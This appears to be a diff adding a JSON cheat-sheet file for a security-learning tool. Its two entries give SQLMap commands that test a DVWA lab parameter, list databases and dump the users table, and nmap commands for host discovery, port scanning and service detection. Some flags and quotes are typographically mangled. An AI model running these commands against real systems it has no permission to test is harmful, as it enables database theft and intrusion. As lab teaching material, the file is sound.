@@ -1,1 +1,14 @@
-[]
+[
+  {
+    "title": "SQL MAP",
+    "icon": "😉",
+    "desc": "SQLMap is an open-source penetration testing tool written in Python. It automates the process of detecting and exploiting SQL Injection vulnerabilities in web applications. Instead of manually typing payloads into php?id=1, SQLMap can test hundreds of payloads, identify the type of injection, and (if allowed) extract database data.",
+    "file": "Test a vulnerable parameter sqlmap -u “http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit\", # List databases sqlmap -u “http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit\" — dbs, # Dump a specific table sqlmap -u “http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit\" -D dvwa -T users — dump"
+  },
+  {
+    "title": "Recon and Enumeration (nmap)",
+    "icon": "👁️",
+    "desc": "The one downside to a tool as robust and powerful as Nmap is remembering so many commands. Even many seasoned industry professionals fail to make the most of Nmap simply because keeping track of all its flags can prove such a challenge.",
+    "file": "-sn\tnmap -sn 192.168.1.0/24\tDiscover what's alive on your network, -F\tnmap -F 192.168.1.10\tScan the most common 100 ports on a single target, -sV -sC\tnmap -sV -sC 192.168.1.10\tRuns service detection (-sV) and default scripts (-sC) to identify what's actually running on open ports"
+  }
+]
